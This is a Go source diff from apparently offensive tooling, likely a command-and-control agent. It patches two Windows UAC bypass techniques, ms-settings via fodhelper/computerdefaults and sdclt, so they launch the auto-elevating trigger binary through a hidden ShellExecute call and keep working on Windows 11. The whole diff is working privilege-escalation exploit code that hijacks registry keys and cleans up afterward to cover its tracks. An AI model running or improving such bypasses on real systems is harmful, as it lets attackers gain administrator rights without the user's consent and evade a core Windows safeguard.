@@ -8,7 +8,6 @@ import (
 	"encoding/json"
 	"fmt"
 	"os"
-	"os/exec"
 	"path/filepath"
 	"strings"
 	"time"
@@ -160,10 +159,15 @@ func uacBypassMsSettings(command, triggerBinary, techniqueName string) structs.C
 	key.Close()
 	output += fmt.Sprintf("[+] Registry set: HKCU\\%s\n", regKeyPath)
 
-	// Step 2: Launch the auto-elevating trigger binary
-	output += "[*] Step 2: Launching trigger binary...\n"
-	cmd := exec.Command(triggerBinary)
-	if err := cmd.Start(); err != nil {
+	// Step 2: Launch the auto-elevating trigger binary via ShellExecuteW.
+	// Auto-elevating binaries (fodhelper, computerdefaults) have the autoElevate
+	// manifest flag. ShellExecuteW triggers the elevation mechanism, while
+	// CreateProcessW (exec.Command) fails with ERROR_ELEVATION_REQUIRED on Win11.
+	output += "[*] Step 2: Launching trigger binary via ShellExecute...\n"
+	verbPtr, _ := windows.UTF16PtrFromString("open")
+	filePtr, _ := windows.UTF16PtrFromString(triggerBinary)
+	err = windows.ShellExecute(0, verbPtr, filePtr, nil, nil, 0 /* SW_HIDE */)
+	if err != nil {
 		cleanupMsSettingsKey()
 		return structs.CommandResult{
 			Output:    output + fmt.Sprintf("Error launching %s: %v", triggerBinary, err),
@@ -171,7 +175,7 @@ func uacBypassMsSettings(command, triggerBinary, techniqueName string) structs.C
 			Completed: true,
 		}
 	}
-	output += fmt.Sprintf("[+] Launched %s (PID: %d)\n", triggerBinary, cmd.Process.Pid)
+	output += fmt.Sprintf("[+] Launched %s via ShellExecute\n", triggerBinary)
 
 	// Step 3: Wait briefly then clean up registry
 	time.Sleep(2 * time.Second)
@@ -246,10 +250,12 @@ func uacBypassSdclt(command string) structs.CommandResult {
 	key.Close()
 	output += fmt.Sprintf("[+] Registry set: HKCU\\%s\n", regKeyPath)
 
-	// Step 2: Launch sdclt.exe
-	output += "[*] Step 2: Launching sdclt.exe...\n"
-	cmd := exec.Command(sdcltPath)
-	if err := cmd.Start(); err != nil {
+	// Step 2: Launch sdclt.exe via ShellExecuteW (same reason as ms-settings: auto-elevate needs ShellExecute)
+	output += "[*] Step 2: Launching sdclt.exe via ShellExecute...\n"
+	verbPtr, _ := windows.UTF16PtrFromString("open")
+	filePtr, _ := windows.UTF16PtrFromString(sdcltPath)
+	err = windows.ShellExecute(0, verbPtr, filePtr, nil, nil, 0 /* SW_HIDE */)
+	if err != nil {
 		cleanupSdcltKey()
 		return structs.CommandResult{
 			Output:    output + fmt.Sprintf("Error launching sdclt.exe: %v", err),
@@ -257,7 +263,7 @@ func uacBypassSdclt(command string) structs.CommandResult {
 			Completed: true,
 		}
 	}
-	output += fmt.Sprintf("[+] Launched sdclt.exe (PID: %d)\n", cmd.Process.Pid)
+	output += "[+] Launched sdclt.exe via ShellExecute\n"
 
 	// Step 3: Wait briefly then clean up registry
 	time.Sleep(2 * time.Second)
